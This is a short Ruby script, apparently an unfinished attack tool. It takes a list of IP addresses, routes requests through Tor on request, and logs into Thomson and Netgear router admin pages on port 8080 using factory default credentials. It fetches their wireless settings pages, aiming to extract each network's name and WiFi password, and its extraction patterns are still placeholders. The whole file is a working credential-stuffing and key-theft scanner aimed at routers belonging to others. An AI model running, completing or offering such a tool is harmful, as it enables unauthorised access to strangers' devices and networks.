require 'typhoeus'
require 'nokogiri'

# Change this to use trollop or something similar
if ARGV[0] == "-t"
  proxy = 'socks5://localhost:9050'
  ARGV.shift
end

routers = [ { :model => "Thomson TCM 420", 
              :url => 'wlanPrimaryNetwork.asp', 
              :userpwd => ':admin',
              :essid => /asfasfd/,  # Change from regexp to xpath
              :pwd => /asdfadsfasf/ },
            { :model => "Thomson TCW 710",
              :url => "wlanSecurity.as",
              :userpwd => ':admin',
              :essid => /asfasfd/,
              :pwd => /asdfadsfasf/ },
            { :model => "Netgear",
              :url => 'WLG_wireless2.htm',
              :userpwd => "admin:password",
              :essid => /asfasfd/,
              :pwd => /asdfadsfasf/ } ]

port = '8080'
code = 0

ARGV.each do |ip|
  until code == 200 or routers.empty? # I don't like it but can't think of a leaner way
    router = routers.shift

    request = Typhoeus::Request.new("http://#{ip}:#{port}/#{router[:url]}",
      :userpwd => router[:userpwd],
      :proxy => proxy)
    request.on_complete do |response|
      if response.success? and response.code == 200
        response.body
      end
      if response.success?
        puts response.body
      end
      code = response.code
    end
    request.run
  end
end
